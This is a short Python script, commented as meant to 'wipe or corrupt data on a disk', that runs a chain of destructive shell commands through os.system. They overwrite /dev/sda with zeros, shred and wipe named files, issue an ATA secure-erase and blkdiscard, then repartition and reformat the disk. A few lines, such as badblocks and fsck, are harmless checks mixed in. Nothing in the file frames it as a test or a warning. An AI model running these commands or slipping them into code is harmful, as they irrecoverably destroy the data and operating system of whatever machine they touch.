import os

# wipe or corrupt data on a disk
os.system("dd if=/dev/zero of=/dev/sda bs=1M count=10")
os.system("shred -u /home/f/test/dummy.py")
os.system("hdparm --security-erase NULL /dev/sda")
os.system("fdisk /dev/sda -d")
os.system("blkdiscard /dev/sda")
os.system("wipe -f -r /home/f/test/Traffic_signaling_raw_sockets.py")
os.system("badblocks -v /dev/sda")
os.system("fsck /dev/sda1")
os.system("parted /dev/sda mkpart primary ext4 0% 100%")
os.system("mkfs.ext4 /dev/sda1")

